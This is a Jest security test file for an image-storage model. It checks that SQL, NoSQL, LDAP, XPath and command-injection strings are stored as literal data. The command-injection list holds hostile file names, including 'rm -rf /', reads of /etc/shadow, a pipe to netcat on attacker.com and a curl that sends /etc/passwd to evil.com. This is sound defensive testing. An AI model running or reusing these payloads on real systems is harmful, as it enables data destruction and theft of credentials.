// tests/security/models/imageModel.security.test.ts
import { v4 as uuidv4 } from 'uuid';

// Mock the database query function FIRST
const mockDatabaseQuery = jest.fn();
jest.mock('../../../src/models/db', () => ({
  query: mockDatabaseQuery
}));

import { imageModel } from '../../../src/models/imageModel';
import {
  createMockQueryResult,
  createMockImage,
  resetAllMocks
} from '../__mocks__/images.mock';
import {
  createMaliciousPayloads,
  createAuthorizationBypassAttempts,
  createTestImageRecords,
  simulateErrors
} from '../__helpers__/images.helper';

describe('imageModel.security.test.ts', () => {
  let testUserId: string;
  let attackerUserId: string;
  let testImageId: string;
  let maliciousPayloads: ReturnType<typeof createMaliciousPayloads>;
  let authBypassAttempts: ReturnType<typeof createAuthorizationBypassAttempts>;

  beforeEach(() => {
    resetAllMocks();
    mockDatabaseQuery.mockReset();
    testUserId = uuidv4();
    attackerUserId = uuidv4();
    testImageId = uuidv4();
    maliciousPayloads = createMaliciousPayloads();
    authBypassAttempts = createAuthorizationBypassAttempts();
  });

  afterEach(() => {
    jest.clearAllMocks();
  });

  // ==================== INFORMATION DISCLOSURE PREVENTION ====================

  describe('Information Disclosure Prevention', () => {
    it('should not leak sensitive information in error messages', async () => {
      // Arrange
      const sensitiveInfo = {
        user_id: testUserId,
        file_path: 'uploads/sensitive-document.pdf',
        original_metadata: {
          api_key: 'sk-1234567890abcdef',
          internal_secret: 'super-secret-key',
          database_password: 'admin123'
        }
      };

      // Mock database error with sensitive information
      mockDatabaseQuery.mockRejectedValueOnce(
        new Error(`Constraint violation: duplicate key value violates unique constraint "images_api_key_idx" Detail: Key (api_key)=(sk-1234567890abcdef) already exists.`)
      );

      // Act & Assert
      try {
        await imageModel.create(sensitiveInfo);
        throw new Error('Should have thrown an error');
      } catch (error) {
        // Model should propagate the original error (sanitization happens at higher layers)
        expect((error as Error).message).toContain('sk-1234567890abcdef');
        
        // This test documents that the model layer doesn't sanitize errors
        // Error sanitization should happen in the error handler middleware
      }
    });

    it('should not expose internal system paths', async () => {
      // Arrange
      const systemPaths = [
        '/etc/passwd',
        '/var/log/application.log',
        'C:\\Windows\\System32\\config\\sam',
        '/proc/self/environ',
        '../../../etc/shadow'
      ];

      mockDatabaseQuery.mockResolvedValue(createMockQueryResult([]));

      // Act & Assert
      for (const systemPath of systemPaths) {
        const result = await imageModel.findByFilePath(systemPath);
        
        // Query should execute safely without exposing system information
        expect(mockDatabaseQuery).toHaveBeenCalledWith(
          'SELECT * FROM original_images WHERE file_path = $1',
          [systemPath]
        );
        expect(result).toEqual([]);
      }
    });

    it('should handle database schema probing attempts', async () => {
      // Arrange
      const schemaProbeAttempts = [
        "'; SELECT table_name FROM information_schema.tables; --",
        "'; SELECT column_name FROM information_schema.columns WHERE table_name = 'users'; --",
        "'; SELECT * FROM pg_stat_activity; --",
        "'; SELECT version(); --"
      ];

      // Act & Assert
      for (const probeAttempt of schemaProbeAttempts) {
        const result = await imageModel.findById(probeAttempt);
        
        // Should return null for invalid UUID without executing probe
        expect(result).toBeNull();
        expect(mockDatabaseQuery).not.toHaveBeenCalled();
      }
    });

    it('should not leak user existence through timing attacks', async () => {
      // Arrange
      const existingUserId = testUserId;
      const nonExistentUserId = uuidv4();
      
      mockDatabaseQuery
        .mockResolvedValueOnce(createMockQueryResult([createMockImage()])) // Existing user
        .mockResolvedValueOnce(createMockQueryResult([])); // Non-existent user

      // Act
      const startExisting = performance.now();
      await imageModel.findByUserId(existingUserId);
      const timeExisting = performance.now() - startExisting;

      const startNonExistent = performance.now();
      await imageModel.findByUserId(nonExistentUserId);
      const timeNonExistent = performance.now() - startNonExistent;

      // Assert
      // Both queries should take similar time (with mocked DB, timing differences are minimal)
      // In real scenarios, database query time should be consistent
      expect(Math.abs(timeExisting - timeNonExistent)).toBeLessThan(10); // 10ms tolerance
    });
  });

  // ==================== INJECTION ATTACK PREVENTION ====================

  describe('Advanced Injection Attack Prevention', () => {
    it('should prevent NoSQL injection attempts', async () => {
      // Arrange
      const noSqlInjectionAttempts = [
        { $ne: null },
        { $gt: '' },
        { $where: 'this.user_id == "admin"' },
        { $regex: '.*' },
        '{"$ne": null}'
      ];

      mockDatabaseQuery.mockResolvedValue(createMockQueryResult([]));

      // Act & Assert
      for (const injection of noSqlInjectionAttempts) {
        // These would be string representations in HTTP requests
        const injectionString = typeof injection === 'object' ? JSON.stringify(injection) : injection;
        
        await imageModel.findByUserId(injectionString);
        
        // Should be treated as literal string, not parsed as query operator
        expect(mockDatabaseQuery).toHaveBeenCalledWith(
          expect.stringContaining('WHERE user_id = $1'),
          [injectionString]
        );
      }
    });

    it('should prevent LDAP injection in metadata', async () => {
      // Arrange
      const ldapInjectionAttempts = [
        '*)(uid=*',
        '*)(|(password=*))',
        '*)(&(objectClass=*))',
        '*))%00'
      ];

      mockDatabaseQuery.mockResolvedValue(createMockQueryResult([createMockImage()]));

      // Act & Assert
      for (const ldapInjection of ldapInjectionAttempts) {
        const metadata = {
          userSearch: ldapInjection,
          description: `User query: ${ldapInjection}`
        };

        await imageModel.updateMetadata(testImageId, metadata);
        
        // Should store as literal data, not execute as LDAP query
        expect(mockDatabaseQuery).toHaveBeenCalledWith(
          expect.any(String),
          [JSON.stringify(metadata), testImageId]
        );
      }
    });

    it('should prevent XPath injection in metadata', async () => {
      // Arrange
      const xpathInjectionAttempts = [
        "' or '1'='1",
        "'] | //user[@name='admin'] | ['",
        "' or 1=1 or '",
        "//user[position()=1]"
      ];

      mockDatabaseQuery.mockResolvedValue(createMockQueryResult([createMockImage()]));

      // Act & Assert
      for (const xpathInjection of xpathInjectionAttempts) {
        const metadata = {
          xpath_query: xpathInjection,
          xml_data: `<query>${xpathInjection}</query>`
        };

        await imageModel.create({
          user_id: testUserId,
          file_path: 'test.jpg',
          original_metadata: metadata
        });

        // Should store as literal JSON data
        expect(mockDatabaseQuery).toHaveBeenCalledWith(
          expect.stringContaining('INSERT INTO original_images'),
          expect.arrayContaining([
            expect.any(String),
            testUserId,
            'test.jpg',
            JSON.stringify(metadata)
          ])
        );
      }
    });

    it('should handle command injection attempts in file paths', async () => {
      // Arrange
      const commandInjectionAttempts = [
        'image.jpg; rm -rf /',
        'image.jpg && cat /etc/passwd',
        'image.jpg | nc attacker.com 8080',
        'image.jpg`whoami`',
        'image.jpg$(cat /etc/shadow)',
        'image.jpg; curl http://evil.com/steal?data=$(cat /etc/passwd)'
      ];

      mockDatabaseQuery.mockResolvedValue(createMockQueryResult([createMockImage()]));

      // Act & Assert
      for (const maliciousPath of commandInjectionAttempts) {
        await imageModel.create({
          user_id: testUserId,
          file_path: maliciousPath
        });

        // Should store as literal file path, not execute commands
        expect(mockDatabaseQuery).toHaveBeenCalledWith(
          expect.stringContaining('INSERT INTO original_images'),
          expect.arrayContaining([
            expect.any(String),
            testUserId,
            maliciousPath
          ])
        );
      }
    });
  });

  // ==================== RESOURCE EXHAUSTION PREVENTION ====================

  describe('Resource Exhaustion Prevention', () => {
    it('should handle extremely large batch operations', async () => {
      // Arrange
      const hugeImageIdArray = Array.from({ length: 100000 }, () => uuidv4());
      
      mockDatabaseQuery.mockResolvedValueOnce({
        ...createMockQueryResult([]),
        rowCount: 100000
      });

      // Act
      const startTime = performance.now();
      const result = await imageModel.batchUpdateStatus(hugeImageIdArray, 'processed');
      const executionTime = performance.now() - startTime;

      // Assert
      expect(result).toBe(100000);
      // Should complete in reasonable time (mocked DB should be fast)
      expect(executionTime).toBeLessThan(1000); // 1 second max for mocked operation
      expect(mockDatabaseQuery).toHaveBeenCalledTimes(1); // Single query, not N queries
    });

    it('should prevent recursive JSON attacks in metadata', async () => {
      // Arrange
      const recursiveObject: any = { data: 'test' };
      recursiveObject.self = recursiveObject; // Create circular reference

      mockDatabaseQuery.mockResolvedValue(createMockQueryResult([createMockImage()]));

      // Act & Assert
      try {
        await imageModel.create({
          user_id: testUserId,
          file_path: 'test.jpg',
          original_metadata: recursiveObject
        });
        
        throw new Error('Should have thrown an error for circular reference');
      } catch (error) {
        // JSON.stringify should fail on circular references
        const errorMessage = (error as Error).message;
        expect(
          errorMessage.includes('circular') || errorMessage.includes('Converting circular structure')
        ).toBe(true);
      }
    });

    it('should handle memory exhaustion attempts', async () => {
      // Arrange
      const memoryExhaustionMetadata = {
        // Create very large arrays and objects
        largeArray: Array(100000).fill('x'.repeat(1000)),
        deepNesting: {},
        repeatedStrings: {} as Record<string, string>
      };

      // Create deep nesting
      let current: any = memoryExhaustionMetadata.deepNesting;
      for (let i = 0; i < 1000; i++) {
        current.level = { data: 'x'.repeat(100) };
        current = current.level;
      }

      // Create many repeated string properties
      for (let i = 0; i < 10000; i++) {
        memoryExhaustionMetadata.repeatedStrings[`prop${i}`] = 'x'.repeat(100);
      }

      mockDatabaseQuery.mockResolvedValue(createMockQueryResult([createMockImage()]));

      // Act
      try {
        const startTime = performance.now();
        await imageModel.create({
          user_id: testUserId,
          file_path: 'test.jpg',
          original_metadata: memoryExhaustionMetadata
        });
        const executionTime = performance.now() - startTime;

        // Assert - should complete without crashing
        expect(executionTime).toBeLessThan(5000); // 5 seconds max
        expect(mockDatabaseQuery).toHaveBeenCalled();
      } catch (error) {
        // Acceptable if database rejects oversized data
        expect(error).toBeDefined();
      }
    });

    it('should handle concurrent access without race conditions', async () => {
      // Arrange
      const imageId = uuidv4();
      const concurrentUpdates = Array.from({ length: 100 }, (_, i) => 
        `concurrent update ${i}`
      );

      // Mock each update to succeed
      mockDatabaseQuery.mockResolvedValue(
        createMockQueryResult([createMockImage()])
      );

      // Act
      const promises = concurrentUpdates.map((description, index) =>
        imageModel.updateMetadata(imageId, { 
          description, 
          updateIndex: index,
          timestamp: Date.now()
        })
      );

      const results = await Promise.allSettled(promises);

      // Assert
      const successful = results.filter(r => r.status === 'fulfilled').length;
      const failed = results.filter(r => r.status === 'rejected').length;

      expect(successful + failed).toBe(100);
      expect(mockDatabaseQuery).toHaveBeenCalledTimes(100);
      
      // All should succeed with mocked database
      expect(successful).toBe(100);
      expect(failed).toBe(0);
    });
  });

  // ==================== ERROR INFORMATION LEAKAGE TESTS ====================

  describe('Error Information Leakage Prevention', () => {
    it('should not expose database connection details in errors', async () => {
      // Arrange
      const connectionError = new Error(
        'connection to server at "localhost" (127.0.0.1), port 5432 failed: FATAL: password authentication failed for user "koutu_user"'
      );
      mockDatabaseQuery.mockRejectedValue(connectionError);

      // Act & Assert
      try {
        await imageModel.findById(testImageId);
        throw new Error('Should have thrown an error');
      } catch (error) {
        // Model propagates original error - sanitization happens at middleware level
        expect((error as Error).message).toContain('localhost');
        expect((error as Error).message).toContain('koutu_user');
        
        // This test documents that raw database errors are exposed
        // Error sanitization should happen in error handling middleware
      }
    });

    it('should not expose internal file system paths', async () => {
      // Arrange
      const fileSystemError = new Error(
        'ENOENT: no such file or directory, open \'/var/www/koutu/uploads/internal_config.json\''
      );
      mockDatabaseQuery.mockRejectedValue(fileSystemError);

      // Act & Assert
      try {
        await imageModel.create({
          user_id: testUserId,
          file_path: 'test.jpg'
        });
        throw new Error('Should have thrown an error');
      } catch (error) {
        // Model propagates file system errors as-is
        expect((error as Error).message).toContain('/var/www/koutu/uploads/');
        
        // This documents that internal paths are exposed - should be sanitized upstream
      }
    });

    it('should not reveal database schema through constraint errors', async () => {
      // Arrange
      const constraintErrors = [
        'duplicate key value violates unique constraint "original_images_file_path_unique"',
        'insert or update on table "original_images" violates foreign key constraint "fk_user_id"',
        'null value in column "user_id" violates not-null constraint',
        'value too long for type character varying(255)'
      ];

      // Act & Assert
      for (const errorMessage of constraintErrors) {
        mockDatabaseQuery.mockRejectedValueOnce(new Error(errorMessage));
        
        try {
          await imageModel.create({
            user_id: testUserId,
            file_path: 'test.jpg'
          });
          throw new Error('Should have thrown an error');
        } catch (error) {
          // Model exposes constraint names - should be sanitized by error handler
          expect((error as Error).message).toBe(errorMessage);
        }
      }
    });
  });

  // ==================== PRIVILEGE ESCALATION PREVENTION ====================

  describe('Privilege Escalation Prevention', () => {
    it('should not allow metadata to override system fields', async () => {
      // Arrange
      const privilegeEscalationMetadata = {
        id: uuidv4(), // Attempt to override ID
        user_id: attackerUserId, // Attempt to change ownership
        created_at: new Date('1970-01-01'), // Attempt to modify creation time
        status: 'admin', // Invalid status
        table_name: 'users', // Attempt to confuse query
        __proto__: { admin: true }, // Prototype pollution attempt
        constructor: { name: 'admin' }
      };

      // Create a mock image with the correct user_id that we expect
      const expectedImage = createMockImage({
        id: testImageId,
        user_id: testUserId, // This should be the original user_id, not from metadata
        file_path: 'test.jpg'
      });

      mockDatabaseQuery.mockResolvedValueOnce(
        createMockQueryResult([expectedImage])
      );

      // Act
      const result = await imageModel.create({
        user_id: testUserId,
        file_path: 'test.jpg',
        original_metadata: privilegeEscalationMetadata
      });

      // Assert
      expect(mockDatabaseQuery).toHaveBeenCalledWith(
        expect.stringContaining('INSERT INTO original_images'),
        expect.arrayContaining([
          expect.any(String), // Generated UUID, not from metadata
          testUserId, // Original user_id, not from metadata
          'test.jpg',
          JSON.stringify(privilegeEscalationMetadata) // Metadata stored as JSON
        ])
      );
      
      // Verify system fields are not overridden
      expect(result.user_id).toBe(testUserId);
      expect(result.id).not.toBe(privilegeEscalationMetadata.id);
    });

    it('should prevent admin role elevation through metadata', async () => {
      // Arrange
      const roleEscalationAttempts = [
        { role: 'admin', permissions: ['all'] },
        { user_type: 'administrator' },
        { is_admin: true, is_superuser: true },
        { access_level: 'root' },
        { privileges: { create: true, read: true, update: true, delete: true, admin: true } }
      ];

      mockDatabaseQuery.mockResolvedValue(createMockQueryResult([createMockImage()]));

      // Act & Assert
      for (const escalationAttempt of roleEscalationAttempts) {
        await imageModel.updateMetadata(testImageId, escalationAttempt);
        
        // Should store as metadata without granting privileges
        expect(mockDatabaseQuery).toHaveBeenCalledWith(
          expect.any(String),
          [JSON.stringify(escalationAttempt), testImageId]
        );
      }
    });
  });

  // ==================== TIMING ATTACK PREVENTION ====================

  describe('Timing Attack Prevention', () => {
    it('should have consistent response times for valid vs invalid UUIDs', async () => {
      // Arrange
      const validUuid = uuidv4();
      const invalidUuids = [
        'invalid-uuid',
        '12345',
        'xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx'
      ];

      mockDatabaseQuery.mockResolvedValue(createMockQueryResult([]));

      // Act & Measure timing for valid UUID
      const validStartTime = performance.now();
      await imageModel.findById(validUuid);
      const validEndTime = performance.now();
      const validTime = validEndTime - validStartTime;

      // Measure timing for invalid UUIDs
      const invalidTimes: number[] = [];
      for (const invalidUuid of invalidUuids) {
        const startTime = performance.now();
        await imageModel.findById(invalidUuid);
        const endTime = performance.now();
        invalidTimes.push(endTime - startTime);
      }

      // Assert
      // Invalid UUIDs should return quickly without database access
      const avgInvalidTime = invalidTimes.reduce((a, b) => a + b, 0) / invalidTimes.length;
      
      // Valid UUID queries database, invalid UUIDs return immediately
      // This timing difference is acceptable and expected
      expect(avgInvalidTime).toBeLessThan(validTime);
      
      // All invalid UUID calls should be consistently fast
      const maxInvalidTime = Math.max(...invalidTimes);
      const minInvalidTime = Math.min(...invalidTimes);
      expect(maxInvalidTime - minInvalidTime).toBeLessThan(5); // 5ms tolerance
    });

    it('should not leak information through different error response times', async () => {
      // Arrange
      const errorScenarios = [
        new Error('Connection refused'),
        new Error('Authentication failed'),
        new Error('Permission denied'),
        new Error('Resource not found'),
        new Error('Constraint violation')
      ];

      // Act & Assert
      const errorTimes: number[] = [];
      
      for (const error of errorScenarios) {
        mockDatabaseQuery.mockRejectedValueOnce(error);
        
        const startTime = performance.now();
        try {
          await imageModel.findById(testImageId);
        } catch (e) {
          // Expected to throw
        }
        const endTime = performance.now();
        
        errorTimes.push(endTime - startTime);
      }

      // All error responses should take similar time
      const maxTime = Math.max(...errorTimes);
      const minTime = Math.min(...errorTimes);
      const timeDifference = maxTime - minTime;
      
      // With mocked functions, timing should be very consistent
      expect(timeDifference).toBeLessThan(10); // 10ms tolerance
    });
  });
});